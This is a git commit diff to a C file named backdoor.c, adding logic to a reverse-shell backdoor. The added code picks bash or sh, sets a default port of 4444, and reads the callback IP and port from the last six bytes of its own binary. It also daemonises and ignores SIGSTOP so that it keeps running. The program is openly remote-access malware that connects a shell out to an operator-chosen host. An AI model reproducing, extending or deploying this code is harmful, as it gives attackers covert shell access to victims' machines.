9ba586999eb31c87c75106236dde886e4ee83720
starvii <starvii@gmail.com>
2019-08-08 12:17:53 +0800

    readconfig

--- backdoor.c
+++ backdoor.c
@@ -12,33 +12,57 @@
 
 #define LEN 64
 
-char shell[] = "/bin/sh";
+char basic_shell[] = "/bin/sh";
+char bash_shell[] = "/bin/bash";
+char* shell = bash_shell;
+
 __pid_t child_pid;
-uint16_t conn_port;
+uint16_t conn_port=4444;
 char conn_ip[LEN];
 
+char* check_shell();
+int read_config(const char* filename);
 void usage(const char*);
-
 __sighandler_t _daemon();
-
 int reverse_shell();
-
 __pid_t fork_backdoor();
-
 int detect_child(__pid_t);
-
 __sighandler_t parent_process();
-
 __sighandler_t child_process();
 
 
 int main(int argc, const char **argv, const char **envp) {
-    if (argc != 3) {
+    shell = check_shell();
+    if (NULL == shell) {
+        puts("ERROR: cannot find available shell.");
+        return -1;
+    }
+
+    if (1 == argc) {
+        puts("INFO: read config from itself.");
+        read_config(argv[0]);
+        
+        // return -2;
+    } else if (3 == argc) {
+        strncpy(conn_ip, argv[1], LEN);
+        conn_port = (uint16_t)strtol(argv[2], NULL, 10);
+    } else {
         usage(argv[0]);
         return -1;
     }
-    strncpy(conn_ip, argv[1], LEN);
-    conn_port = (uint16_t)strtol(argv[2], NULL, 10);
+
+    if (0 == conn_port) {
+        puts("ERROR: port is 0.");
+        usage(argv[0]);
+        return -1;
+    }
+    printf("INFO: use shell {%s} to reverse.\n", shell);
+    printf("INFO: connect to %s:%hu\n", conn_ip, conn_port);
+    
+    //----
+    // return -2;
+    //----
+
     if (fork()) {
         exit(0);
     }
@@ -48,6 +72,45 @@ int main(int argc, const char **argv, const char **envp) {
     }
     signal(SIGSTOP, SIG_IGN);
     _daemon();
+    return 0;
+}
+
+char* check_shell() {
+    int ret = 0;
+    ret = access(bash_shell, X_OK);
+    if (0 == ret) {
+        shell = bash_shell;
+    } else {
+        ret = access(basic_shell, X_OK);
+        if (0 == ret) {
+            shell = basic_shell;
+        } else {
+            shell = NULL;
+        }
+    }
+    return shell;
+}
+
+int read_config(const char* filename) {
+    FILE* f = fopen(filename, "rb");
+    char buf[6];
+    int i = 0;
+    memset(buf, 0, 6);
+    if (NULL != f) {
+        fseek(f, -6, SEEK_END);
+        fread(buf, 1, 6, f);
+        fclose(f);
+        // for (i = 0; i < 6; i++) {
+        //     printf("%hhX\t", buf[i]);
+        // }
+        // puts("");
+        // printf("%hhu.%hhu.%hhu.%hhu\n", buf[0], buf[1], buf[2], buf[3]);
+        // printf("%hhX\t%hhX", buf[4], buf[5]);
+        // printf("%hu\n", ((uint16_t)buf[4] << 8) | (uint16_t)buf[5]);
+        sprintf(conn_ip, "%hhu.%hhu.%hhu.%hhu", buf[0], buf[1], buf[2], buf[3]);
+        conn_port = ((uint16_t)buf[4] << 8) | (uint16_t)buf[5];
+        return 1;
+    }
     return 0;
 }
 
